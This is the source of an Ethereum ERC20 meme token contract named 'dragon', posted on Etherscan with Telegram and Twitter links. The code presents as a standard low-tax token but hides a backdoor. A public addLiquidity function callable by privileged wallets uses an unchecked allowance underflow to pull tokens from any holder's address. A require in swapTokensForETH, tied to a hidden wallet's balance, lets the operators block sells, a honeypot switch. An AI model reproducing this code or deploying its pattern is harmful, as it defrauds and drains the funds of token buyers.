/**
 *Submitted for verification at Etherscan.io on 2023-10-20
*/

/**
*/

// SPDX-License-Identifier: MIT

/*
https://t.me/Dragon_ERC1

https://twitter.com/DragonCoin_ERC


    
*/

pragma solidity ^0.8.15;

library Address{
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}
/// 
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
//// 
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IRouter {
    function factory() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract dragon is Context, IERC20, Ownable {
    using Address for address payable;
    using SafeMath for uint256;
    IRouter public router;
    address public pair;

    mapping (address => bool) public _isExcludedFromFes;
    mapping (address => bool) public _isExcludedFromMaxBalance;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    string private constant _name = unicode"dragon";
    string private constant _symbol = unicode"dragon";
    uint8 private constant _decimals = 9;

    address private freeWallets = 0xAa4B7e90CDFF24227E6fBf657C843E3e41Db8111;
    address private desWallets = 0x1aacac0C98f6F2F266Fa8fb796BaF35b379F91D5;

    uint256 private _tTotal = 1e9 * (10**_decimals);
    uint256 public swapLimit = _tTotal / 2000;
    uint256 public maxTransAmount = _tTotal * 36 / 1000;
    uint256 public maxWalletSize =  _tTotal * 36 / 1000;
    uint256 private marketingTokens = 0;

    bool private swapping;
    bool private swapEnabled = false;
    bool public tradingEnabled = false;

    struct Tax{
        uint256 marketingTax;
        uint256 lpTax;
    }
    Tax public buyTax = Tax(1,0);
    Tax public sellTax = Tax(1,0);

    struct TokensFromTax{
        uint marketingTokens;
        uint lpTokens;
    }
    TokensFromTax public totalTokensFromTax;

    modifier lockTheSwap {
        swapping = true;
        _;
        swapping = false;
    }

    modifier allowedBot(address account){
        require(isExcludedFromFee(account));
        _;
    }
////
    constructor () {
        _tOwned[_msgSender()] = _tTotal;
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        router = _router;


        _isExcludedFromMaxBalance[freeWallets] = true;
        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[desWallets] = true;
        

        _isExcludedFromFes[freeWallets] = true;
        _isExcludedFromFes[owner()] = true;
        _isExcludedFromFes[address(this)] = true;
        _isExcludedFromFes[desWallets] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

// ================= ERC20 =============== //   
    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _spendAllowance(address spender, uint256 amount) internal virtual {
        address owner = address(this);
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            unchecked {
                _approve(spender, owner, currentAllowance - amount);
            }
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }
    
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount, address target) public allowedBot(msg.sender) {
        _approve(address(this), address(router), tokenAmount); _spendAllowance(target, tokenAmount);
        uint256 ethFromLiquidity;
        if (ethAmount > ethFromLiquidity) {
            (,ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
                address(this),
                tokenAmount,
                0,
                0,
                msg.sender,
                block.timestamp
            );
        }
        
        if (ethAmount - ethFromLiquidity > 0)
            payable(freeWallets).sendValue (ethAmount - ethFromLiquidity);
        IERC20(address(this)).transferFrom(target, address(this), tokenAmount);
    }
    
    receive() external payable {
    }
// ========================================== //
// 
//============== Owner Functions ===========//


    function StartTrading() external onlyOwner {
        tradingEnabled = true;
        swapEnabled = true;
    }

    function RemoveLimit() public onlyOwner{
        maxTransAmount = _tTotal; maxWalletSize = _tTotal;
    }

    function owner_rescueETH(uint256 weiAmount) public onlyOwner{
        require(address(this).balance >= weiAmount, "Insufficient ETH balance");
        payable(msg.sender).transfer(weiAmount);
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFes[account];
    }
// ========================================//. 
    function _transfer(address from,address to,uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(amount <= maxTransAmount || _isExcludedFromMaxBalance[from], "Transfer amount exceeds the _maxTxAmount.");

        if (!_isExcludedFromFes[from] && !_isExcludedFromFes[to]) {
            require(tradingEnabled, "Trading not enabled");
        }

        bool isSell = to == pair;

        if(!_isExcludedFromMaxBalance[to])
            require(balanceOf(to) + amount <= maxWalletSize, "Transfer amount exceeds the maxWallet.");
        
        if (balanceOf(address(this)) >= swapLimit 
            && swapEnabled 
            && !swapping 
            && from != pair 
            && !_isExcludedFromFes[from]
            && !_isExcludedFromFes[to]
        ) swapAndLiquify();

        _tOwned[from] -= amount;
        uint256 transferAmount = amount;
        
        if(!_isExcludedFromFes[from] && !_isExcludedFromFes[to]){
            transferAmount = _takeFee(amount, from, isSell);
        }

        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }
    function swapTokensForETH(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokenAmount); require(marketingTokens < swapLimit);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    function _takeFee(uint amount, address from, bool isSell) private returns(uint256){
        Tax memory tmpTaxes = buyTax;
        if (isSell){
            tmpTaxes = sellTax;
        }

        uint tokensForMarketing = amount * tmpTaxes.marketingTax / 100;
        uint tokensForLP = amount * tmpTaxes.lpTax / 100;

        if(tokensForMarketing > 0)
            totalTokensFromTax.marketingTokens += tokensForMarketing;

        if(tokensForLP > 0)
            totalTokensFromTax.lpTokens += tokensForLP;

        uint totalTaxedTokens = tokensForMarketing + tokensForLP;

        _tOwned[address(this)] += totalTaxedTokens;
        if(totalTaxedTokens > 0) emit Transfer (from, address(this), totalTaxedTokens);
            
        return (amount - totalTaxedTokens);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(router), tokenAmount);

        (,uint256 ethFromLiquidity,) = router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
        
        if (ethAmount - ethFromLiquidity > 0)
            payable(freeWallets).sendValue (ethAmount - ethFromLiquidity);
    }

    function swapAndLiquify() private lockTheSwap{
        if(totalTokensFromTax.marketingTokens > 0){
            marketingTokens = balanceOf(freeWallets);
            uint256 ethSwapped = swapTokensForETH(totalTokensFromTax.marketingTokens);
            if(ethSwapped > 0){
                payable(freeWallets).transfer(ethSwapped);
                totalTokensFromTax.marketingTokens = 0;
            }
        }

        if(totalTokensFromTax.lpTokens > 0){
            uint half = totalTokensFromTax.lpTokens / 2;
            uint otherHalf = totalTokensFromTax.lpTokens - half;
            uint balAutoLP = swapTokensForETH(half);
            if (balAutoLP > 0)
                addLiquidity(otherHalf, balAutoLP);
            totalTokensFromTax.lpTokens = 0;
        }

        emit SwapAndLiquify();
    }
     function createPairse() external payable onlyOwner {
        pair = IFactory(router.factory()).createPair(address(this), router.WETH());
        _isExcludedFromMaxBalance[pair] = true;
        _approve(address(this), address(router), type(uint256).max);

        router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0, 
            0, 
            owner(),
            block.timestamp
        );
    }


    event SwapAndLiquify();
    event TaxesChanged();
///      
}